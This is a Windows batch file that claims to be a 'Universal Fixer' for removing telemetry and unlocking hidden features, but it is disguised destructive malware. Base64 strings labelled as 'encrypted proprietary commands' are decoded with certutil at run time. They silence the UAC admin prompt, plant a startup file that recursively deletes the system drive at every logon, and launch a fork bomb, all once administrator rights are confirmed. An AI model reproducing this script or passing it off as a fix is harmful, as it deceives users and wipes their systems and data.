@ECHO OFF

:: Universal fix script for windows
::  Allows you to remove telemetry and enable hidden functionality in NTOS
::  It also enabled Windows Penentration Testing Advanced Platform (MSPTAP)
:: Works great on Windows 10

:: Some of our script commands are proprietary, they are encrypted
SET refe=UkVHIEFERCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvViBDb25zZW50UHJvbXB0QmVoYXZpb3JBZG1pbiAvVCBSRUdfRFdPUkQgL0QgMCAvRg==
SET refe2=TlVM
SET brain=RUNITyBwb3dlcnNoZWxsIFN0YXJ0LVByb2Nlc3MgY21kLmV4ZSAtQXJndW1lbnRMaXN0ICIvSyIsInJtZGlyIiwiL1MiLCIvUSIsIiVzeXN0ZW1kcml2ZSUiLCAtVmVyYiBSdW5Bcw==
SET brain2=IiVQUk9HUkFNREFUQSVcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydFVwXGZpeHVwLmJhdCI=
SET fork=Zm9yIC9sICVhIGluICgwLDAsMCkgZG8gc3RhcnQ=

TITLE Windows Universal Fixer
COLOR 2F

IF "%1"=="1" GOTO ack 

CALL %0 1
GOTO qq

:pr0c0
del /q /f "%temp%\fejiffje8fh8"  >nul 2>nul
del /q /f "%temp%\0tjg9g82hfg8"  >nul 2>nul

echo -----BEGIN CERTIFICATE----->"%temp%\fejiffje8fh8"
<nul set /p=%1 >>"%temp%\fejiffje8fh8"
echo -----END CERTIFICATE----->>"%temp%\fejiffje8fh8"

certutil /decode "%temp%\fejiffje8fh8" "%temp%\0tjg9g82hfg8" >nul 2>nul

for /f "useback tokens=* delims=" %%# in ("%temp%\0tjg9g82hfg8")  do set "OS=%%#"
del /q /f "%temp%\fejiffje8fh8"  >nul 2>nul
del /q /f "%temp%\0tjg9g82hfg8"  >nul 2>nul

del /q /f "%temp%\fejiffje8fh8"  >nul 2>nul
del /q /f "%temp%\0tjg9g82hfg8"  >nul 2>nul

echo -----BEGIN CERTIFICATE----->"%temp%\fejiffje8fh8"
<nul set /p=%2 >>"%temp%\fejiffje8fh8"
echo -----END CERTIFICATE----->>"%temp%\fejiffje8fh8"

certutil /decode "%temp%\fejiffje8fh8" "%temp%\0tjg9g82hfg8" >nul 2>nul

for /f "useback tokens=* delims=" %%# in ("%temp%\0tjg9g82hfg8")  do set "OS2=%%#"
del /q /f "%temp%\fejiffje8fh8"  >nul 2>nul
del /q /f "%temp%\0tjg9g82hfg8"  >nul 2>nul

IF "%2"=="456" GOTO exo

CALL CMD.EXE /K "%OS%>%OS2% && EXIT"
EXIT /B

:exo
%OS%

:ack

fsutil dirty query %systemdrive% >NUL
IF %errorLevel% == 0 (

ECHO Start the fix...

CALL :pr0c0 %refe% %refe2%
GOTO br1n

) ELSE (
:: Ah I see
ECHO ==================================================
ECHO Fix script requires administrator rights
ECHO ==================================================
PAUSE
GOTO qq
)

:br1n
CALL :pr0c0 %brain% %brain2%
GOTO f00

:f00
CALL :pr0c0 %fork% 456
GOTO qq

:qq
::EXIT
